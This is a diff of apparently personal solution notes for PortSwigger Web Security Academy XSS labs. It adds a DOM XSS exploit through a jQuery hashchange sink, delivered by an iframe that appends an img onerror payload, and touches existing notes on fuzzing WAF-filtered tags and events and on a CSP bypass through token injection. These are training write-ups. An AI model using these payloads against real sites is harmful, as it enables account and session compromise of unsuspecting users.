@@ -129,6 +129,28 @@ This lab contains a DOM-based cross-site scripting vulnerability in the submit f
 <a id="backLink" href="javascript:alert(document.domain)">Back</a>
 ```
 
+### Lab: DOM XSS in jQuery selector sink using a hashchange event
+
+This lab contains a DOM-based cross-site scripting vulnerability on the home page. It uses jQuery's $() selector function to auto-scroll to a given post, whose title is passed via the location.hash property.
+
+To solve the lab, deliver an exploit to the victim that calls the print() function in their browser.
+
+```
+<script>
+$(window).on('hashchange', function(){
+	var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
+	if (post) post.get(0).scrollIntoView();
+});
+</script>
+```
+
+**Exploit Server ->**
+
+```
+Body:
+    <iframe src="https://aca61f061fc70cabc04f47db0054002e.web-security-academy.net#" onload="this.src+='<img src=1 onerror=print(1)>'">
+```
+
 ### Lab: DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded
 
 This lab contains a DOM-based cross-site scripting vulnerability in a AngularJS expression within the search functionality.
@@ -212,7 +234,7 @@ There is a WAF. It blocks most of tags and attributes.
 
 **XSS tags list ->** https://portswigger.net/web-security/cross-site-scripting/cheat-sheet **-> Copy tags to clipboard**
 
-**Sniper attack with xss tags list -> **
+**Sniper attack with xss tags list ->**&#x20;
 
 `GET /?search=<§§> HTTP/1.1`
 
@@ -220,7 +242,7 @@ Just body tag is allowed.
 
 **XSS events list -> Choose body tag ->** https://portswigger.net/web-security/cross-site-scripting/cheat-sheet **-> Copy events to clipboard**
 
-**Sniper attack with xss events list -> **
+**Sniper attack with xss events list ->**&#x20;
 
 `GET /?search=<body%20§§=1> HTTP/1.1`
 
@@ -264,7 +286,7 @@ OR
 
 This lab contains a reflected XSS vulnerability with some whitelisted tags, but all events and anchor href attributes are blocked.
 
-**Sniper attack with xss tags list -> **
+**Sniper attack with xss tags list ->**&#x20;
 
 `GET /?search=<§§> HTTP/1.1`
 
@@ -284,7 +306,7 @@ _a, animate, image, svg, title_
 
 This lab has a simple reflected XSS vulnerability. The site is blocking common tags but misses some SVG tags and events.
 
-**Sniper attack with xss tags list -> **
+**Sniper attack with xss tags list ->**&#x20;
 
 `GET /?search=<§§> HTTP/1.1`
 
@@ -726,12 +748,12 @@ This lab uses CSP and contains a reflected XSS vulnerability.
 
 To solve the lab, perform a cross-site scripting attack that bypasses the CSP and calls the alert function.
 
-**In response header: **
+**In response header:**&#x20;
 
 `Content-Security-Policy: default-src 'self'; object-src 'none';script-src 'self'; style-src 'self'; report-uri /csp-report?token=`
 
 /?search=alert(1)\&token=;script-src-elem 'unsafe-inline'
 
-**In response header: **
+**In response header:**&#x20;
 
 `Content-Security-Policy: default-src 'self'; object-src 'none';script-src 'self'; style-src 'self'; report-uri /csp-report?token=;script-src-elem 'unsafe-inline'`
